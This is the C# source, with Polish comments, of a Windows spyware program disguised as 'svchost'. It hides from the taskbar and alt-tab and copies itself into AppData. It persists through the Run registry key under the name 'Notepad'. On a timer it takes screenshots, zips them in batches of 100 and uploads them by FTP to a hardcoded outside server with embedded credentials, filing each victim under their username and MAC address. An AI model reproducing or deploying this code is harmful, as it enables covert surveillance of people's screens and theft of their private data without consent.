using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.IO.Compression;
using System.Diagnostics;
using System.Net.NetworkInformation;

namespace svchost
{
    public partial class svchost : Form
    {
        /*
         * Zmienne globalne.
         * */
        static int licznikZdjec = 1;
        static int licznikArchiwum = 0;
        static string MAC;
        public svchost()
        {
            InitializeComponent();
            MAC = GetMacAddress();
            string ścieżka = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            ścieżka += "\\Windows Languages\\plik.txt";

            stworzFolderFTP();

            this.WindowState = FormWindowState.Minimized; //ukrywanie
            this.ShowInTaskbar = false;
            Form form1 = new Form(); //tworzymy nowy pusty form, ktory ma wlasciwosci FixedTool, ktore sprawiaja, ze jest poza alt-tabem, nasz form staje sie jego dzieckiem, wiec znika w chuj
            form1.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            form1.ShowInTaskbar = false;
            this.Owner = form1;
            //tworzenie folderu do któego ma być kopiowany program 
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows Languages\");
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows Languages\\Data\\");
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows Languages\\Nie_wyslane\\");
            usunFolder(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows Languages\\Data\\");

            //kopiowanie do folderu
            string exePath = Application.ExecutablePath;
            string copyPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            copyPath += "\\Windows Languages\\" + Path.GetFileName(exePath);
            string sciezkaDLL = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows Languages\\Ionic.Zip.dll";
            string sciezkaXML = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows Languages\\Ionic.Zip.xml";

            //jesli aplikacja nie jest "zainstalowana" w swoim folderze, tylko uruchomiona z innej lokalizacji
            if (File.Exists(copyPath) == false) //kopiuj exe i potrzebne dll
            {
                File.Copy(exePath, copyPath);
                File.Copy(Application.StartupPath + "\\Ionic.Zip.dll", sciezkaDLL);
                File.Copy(Application.StartupPath + "\\Ionic.Zip.xml", sciezkaXML);
                uruchomZDomyslnejLokalizacji();
            }

            //dodawanie do rejestru tak aby uruchamiał się ze startem systemu.
            Microsoft.Win32.RegistryKey add = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string pathrejestr = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            add.SetValue("Notepad", "\"" + pathrejestr + "\\Windows Languages\\" + "svchost.exe" + "\"");
            if (File.Exists(ścieżka) == false)
            {
                resetowanieLicznika();
            }
            else
            {
                wczytywanieLicznika();
            }

        }
        /***
         * Na początku deklarujemy 2 zmienne, jedna przechowa zawartość ekranu, druga posłuży do stworzenia i zapisu bitmapy
         * na dysk. Na początku tworzymy bitmapę o rozmiarach naszego ekranu. Rozmiar ekranu pobieramy przez statyczną klasę Screen.
         * Pobierana jest szerokość i wysokość oraz tryb palety kolorów 32 bitowy. Inicjalizujemy zmienną gfxScreenshot pustą bitmapą
         * o zadanych rozmiarach. Następnie wypełniamy ją bieżącą zawartością ekranu, oraz zapisujemy ją do pliku, używając funkcji
         * dbającej o to, by nie nadpisywać plików, tylko tworzyć następne w danym folderze. Na sam koniec zwalniamy zasoby użyte do
         * stworzenia zrzutu ekranu.
         * */
        public void tworzenieZrzutuEkranu()
        {
            Bitmap bmpScreenshot;
            Graphics gfxScreenshot;           
            bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            try
            {   //raz na 1/13000 razy potrafi sie zakleszczyc            
                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            }
            catch
            { }
            string copyPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            copyPath += "\\Windows Languages\\Data\\";
            bmpScreenshot.Save(saveFileWithoutOverwrite("plik.jpg", copyPath).ToString(), ImageFormat.Jpeg);
            bmpScreenshot.Dispose(); //czyszczenie pamieci bo proces zaczyna sie od nowa co 5s
            gfxScreenshot.Dispose();
            bmpScreenshot.Dispose();
        }

        public static string GetMacAddress()
        {
            string macAddresses = string.Empty;

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up)
                {
                    macAddresses += nic.GetPhysicalAddress().ToString();
                    break;
                }
            }
            return macAddresses;
        }
        /***
         * Funkcja ta powoduje, że pliki zapisywane o tej samej nazwie dostają dodatkowy numer, w przypadku zapisu pliku
         * o nazwie “plik” w tym samym folderze, dostaniemy plik[1],plik[2] itd.
         * Na samym poczatku rozdzielamy nazwę pliku na część bez rozszerzenia i rozszerzenie.
         * Do zmiennej ext wpisujemy rozszerzenie, a do zmiennej prefix nazwę pliku. Jeśli plik o takiej samej nazwie
         * jaką chcemy zapisać istnieje (czyli w przypadku naszego programu, prawie zawsze) to tworzona jest nowa nazwa,
         * która składa się z nazwy, nawiasów klamrowych z licznikiem zdjęć (który jest zwiększany o 1 przy każdym zapisanym zdjęciu)
         * i rozszerzeniu, które nie jest zmieniane.
         * 
         * @param input nazwa pliku
         * @param saveTo ścieżka gdzie chcemy zapisać plik
         * @return obiekt FileInfo gotowy do zapisania pliku
         * */
        public static FileInfo saveFileWithoutOverwrite(string input, string saveTo) //powoduje nazwaPliku[1],nazwaPliku[2]
        {
            //przy setnym pliku, robimy archiwum i zaczynamy proces od nowa
            if (licznikZdjec % 101 == 0)
            {
                kompresja100plikow();
            }
            string fileName = input;
            string[] fileNameSplit = fileName.Split(new char[] { '.' });
            string ext = "." + fileNameSplit[fileNameSplit.Count() - 1];
            string prefix = fileName.Substring(0, fileName.Length - ext.Length);
            while (File.Exists(saveTo + fileName))
            {
                fileName = prefix + "[" + (licznikZdjec - 1).ToString() + "]" + ext;
                licznikZdjec++;
            }
            return new FileInfo(saveTo + fileName);
        }
        /***
         * Funkcja jako argument bierze ścieżkę do pliku oraz nazwę pliku. Wynika to z tego, że zachowujemy w ten sposób porządek
         * przy dużej ilości plików w folderze (w naszym wypadku 100). Na początku deklarujemy wszystkie zmienne i informacje których
         * potrzebujemy - jest to ścieżka do naszego archiwum, adres IP serwera FTP, nazwa użytkownika serwera oraz jego hasło.
         * Tworzymy obiekt FileInfo aby móc manipulować naszym plikiem, oraz zapytanie do serwera FTP wraz ze ścieżką, w której
         * zapisujemy archiwum ze zdjęciami na serwerze (nazwa folderu jest nazwą użytkownika Windows oraz jego adresem MAC aby
         * zapewnić unikalność nazw).
         * Następnie tworzymy obiekt zawierający dane użytkownika, niezbędny do połączenia z serwerem. Ustawiamy właściwości zapytania
         * do serwera, KeepAlive ustawiane jest na false, aby zamknąć połączenie po przesłaniu pliku, UsePassive jest true, aby
         * uniknąć problemów z Firewallami, UseBinary sygnalizuje, że bedzięmy przesyłać plik. Rozmiar pliku zapytania ustawiany
         * jest równy rozmiarowi pliku. Następnie definiujemy tryb zapytania na wysyłanie pliku. 
         * Definiujemy bufor, w którym będa przechowywane dane ze strumienia pliku z dysku lokalnego.
         * W naszym przypadku jest 16 bitowy. Następnie tworzymy strumień, z którego odczytujemy dane naszego archiwum ze zdjęciami
         * i łączymy go z zapytaniem do serwera FTP, a następnie w pętli kopiujemy do niego dane. Wysyłanie odbywa się synchronicznie,
         * po zakończeniu zwalniamy zasoby.
         * */
        public static void wyslijFTP(string pelnaSciezkaPliku, string nazwaPliku)
        {
            int iloscNormalnychProb = 0;
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            path += "\\Windows Languages\\";
            string ftpServerIP = "ftp://31.170.167.102:21/";
            string ftpUserName = "u846105293.ukw1";
            string ftpPassword = "zaq12wsx";

            FileInfo objFile = new FileInfo(pelnaSciezkaPliku);

            FtpWebRequest objFTPRequest;
            objFTPRequest = (FtpWebRequest)FtpWebRequest.Create(new Uri(ftpServerIP + "//public_html//" + Environment.UserName + "-" + MAC + "//" + objFile.Name));
            objFTPRequest.Credentials = new NetworkCredential(ftpUserName, ftpPassword);
            objFTPRequest.KeepAlive = false;
            objFTPRequest.UsePassive = true;
            objFTPRequest.UseBinary = true;
            objFTPRequest.ContentLength = objFile.Length;
            objFTPRequest.Method = WebRequestMethods.Ftp.UploadFile;

            int intBufferLength = 16 * 1024;
            byte[] objBuffer = new byte[intBufferLength];

            FileStream objFileStream = objFile.OpenRead();
            sprobojPonownieNormalnie:
            try //wysylaj
            {
                Stream objStream = objFTPRequest.GetRequestStream();
                int len = 0;
                while ((len = objFileStream.Read(objBuffer, 0, intBufferLength)) != 0)
                {
                    objStream.Write(objBuffer, 0, len);
                }
                objStream.Close();
                objFileStream.Close();
                objStream.Dispose();
                objFileStream.Dispose();
            }
            catch
            {
                if (iloscNormalnychProb == 0) //sproboj 2 raz wyslac jesli nie wyjdzie
                {
                    iloscNormalnychProb++;
                    goto sprobojPonownieNormalnie;
                }
                objFileStream.Close();
                objFileStream.Dispose();
            sprobojPonownieBezInternetu:
                //jesli brak internetu, tu wyladujemy 
                try
                {
                    objFile.MoveTo(path + "//Nie_wyslane//" + nazwaPliku);
                }
                catch
                {
                    goto sprobojPonownieBezInternetu; //wybacz mi Panie, bo zgrzeszylem goto
                }
                return;
            }

        sprobojPonownie: // nie zawsze usuwal, bo proces mial jeszcze dostep do pliku (rzadki przypadek)
            try
            {
                objFile.Delete();
            }
            catch
            {
                goto sprobojPonownie;
            }
        }
        static void kompresja100plikow()
        {
            int start = licznikZdjec - 101;
            int start100 = start + 100;
            if (start < 0)
                start = 1;
            using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile())
            {
                for (; start < start100; start++)
                {
                    zip.AddFile(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ("\\Windows Languages\\Data\\plik[" + start + "].jpg"));
                }
                string sciezkaArchiwum = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                sciezkaArchiwum += "\\Windows Languages\\";
                string nazwaArchiwum = sciezkaArchiwum.ToString() + "Pictures[" + licznikArchiwum.ToString() + "].zip";  //funkcja zapiszArchiwum z takim argumentem zwroci cala sciezke, idealnie gotowa do zapisu
                zip.Save(nazwaArchiwum);
                zip.Dispose();
                usunCalyFolder(); //czyszczenie wszystkich zdjec z folderu
                int temp = licznikArchiwum; // nie chcemy zmieniac statycznej zmiennej
                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                path += "\\Windows Languages\\";
                wyslijFTP(path + "Pictures[" + (temp).ToString() + "].zip", "Pictures[" + (temp).ToString() + "].zip");
                licznikZdjec = 1; // ustawiamy licznki na 1 ponieważ po usunięciu pliku tworzy numeracje od nowa
                licznikArchiwum++;
                zapiszLiczniki();
            }
        }
        static void usunCalyFolder()
        {
            string copyPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            copyPath += "\\Windows Languages\\Data\\";
            string directoryPath = copyPath;
            Directory.GetFiles(directoryPath).ToList().ForEach(File.Delete);
            Directory.GetDirectories(directoryPath).ToList().ForEach(Directory.Delete);
        }
        /***
         * Funkcja wywolywana zawsze przy uruchomieniu programu, poniewaz jesli folder istnieje, serwer zwroci taki komunikat,
         * i nie musimy sie tym przejmowac. Gwarantuje to nam, ze nie bedzie bledow przy wysylaniu z powodu braku folderu. 
         * */
        void stworzFolderFTP()
        {
            try
            {
                string uzytkownik = Environment.UserName;
                WebRequest request = WebRequest.Create("ftp://31.170.167.102:21/" + uzytkownik + "-" + MAC); //na 100% unikalna nazwa folderu
                request.Method = WebRequestMethods.Ftp.MakeDirectory;
                request.Credentials = new NetworkCredential("u846105293.ukw1", "zaq12wsx");
                var resp = (FtpWebResponse)request.GetResponse();
            }
            catch // catch z powodu pojawienia się tej samej nazwy folderu 
            {
                //robimy tyle co nic          
            }
        }
        /***
         * Wywolywane tylko wtedy przy pierwszym uruchomieniu lub braku pliku z zapisanym licznikiem.
         * */
        void resetowanieLicznika()
        {
            string ścieżka = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            ścieżka += "\\Windows Languages\\plik.txt";
            File.Create(ścieżka).Dispose();
            File.WriteAllText(ścieżka, "0");
        }
        static void zapiszLiczniki()
        {
            string ścieżka = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            ścieżka += "\\Windows Languages\\plik.txt";
            File.WriteAllText(ścieżka, licznikArchiwum.ToString());
        }
        static void wczytywanieLicznika()
        {
            string ścieżka = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            ścieżka += "\\Windows Languages\\plik.txt";
            int licznik = Int32.Parse(File.ReadAllText(ścieżka));
            licznikArchiwum = licznik;
        }
        /***
         * Odpal sie z domyslnej lokalizacji, a nastepnie zamknij z obecnej lokalizacji (kopiowanie nastapilo wczesniej)
         * */
        void uruchomZDomyslnejLokalizacji()
        {
            Process firstProc = new Process();
            string ścieżkaOpen = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            ścieżkaOpen += "\\Windows Languages\\svchost.EXE"; ;
            firstProc.StartInfo.FileName = ścieżkaOpen;
            firstProc.EnableRaisingEvents = true;
            firstProc.Start();
            Environment.Exit(0);
        }
        private void robienieZdjec_Tick(object sender, EventArgs e)
        {
            tworzenieZrzutuEkranu();
        }

        private void wysylanieStosu_Tick_1(object sender, EventArgs e)
        {
            //wysylanie tego, co odlozylismy do folderu nie_wyslane przez brak internetu
            string ścieżka = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            ścieżka += "\\Windows Languages\\Nie_wyslane\\";
            string[] listaPlikow = Directory.GetFiles(ścieżka);
            if (listaPlikow.Length >= 10)
            {
                usunFolder(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Windows Languages\\Nie_wyslane\\"); //aby nie obciazac internetu za mocno po dlugim okresie bez internetu
                return;
            }
            for (int i = 0; i < listaPlikow.Length; i++)
            {
                wyslijFTP(listaPlikow[i], Path.GetFileName(listaPlikow[i]));
            }
        }
        /*
        * Funkcja usuwa wszystko w folderze w 1 petli, a potem usuwa sam folder.
        * @param FolderName sciezka do usuwanego folderu
        * */
        private void usunFolder(string FolderName)
        {
            DirectoryInfo dir = new DirectoryInfo(FolderName);

            foreach (FileInfo fi in dir.GetFiles())
            {
                fi.Delete();
            }

            foreach (DirectoryInfo di in dir.GetDirectories())
            {
                usunFolder(di.FullName);
                di.Delete();
            }
        }
    }
}
